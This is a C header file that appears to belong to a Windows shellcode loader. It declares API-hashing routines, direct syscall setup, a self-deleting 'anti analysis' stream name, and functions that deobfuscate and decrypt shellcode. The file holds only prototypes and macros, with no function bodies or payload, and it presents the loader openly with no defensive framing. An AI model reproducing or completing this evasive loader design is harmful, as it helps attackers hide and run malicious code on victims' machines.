#pragma once

#include <Windows.h>
#include <bcrypt.h>

//#if defined(DEBUG) && !defined(NO_CRT_LIB)
#include <stdio.h>
//#endif

#include "structs.h"

/* functions prototypes - functions defined in 'WinApi.c' */
// seed of the HashStringJenkinsOneAtATime32BitA/W funtions
#define INITIAL_SEED	8
UINT32 HashStringJenkinsOneAtATime32BitW(_In_ PWCHAR String);
UINT32 HashStringJenkinsOneAtATime32BitA(_In_ PCHAR String);
#define HASHA(API) (HashStringJenkinsOneAtATime32BitA((PCHAR) API))
#define HASHW(API) (HashStringJenkinsOneAtATime32BitW((PWCHAR) API))

/* Syscalls */
InitializeSyscalls();

/* Anti Analysis */

// the new data stream name to self delete
#define NEW_STREAM L":Delete"

/* Obfuscation */
BOOL deobfuscate(IN CHAR * ShellcodeArray[], IN SIZE_T NmbrOfElements, OUT PBYTE * ppDAddress, OUT SIZE_T * pDSize);

/* Encryption */
BOOL decrypt(IN PBYTE pShellcode, IN SIZE_T sShellcodeSize, IN PBYTE bKey, IN SIZE_T sKeySize);
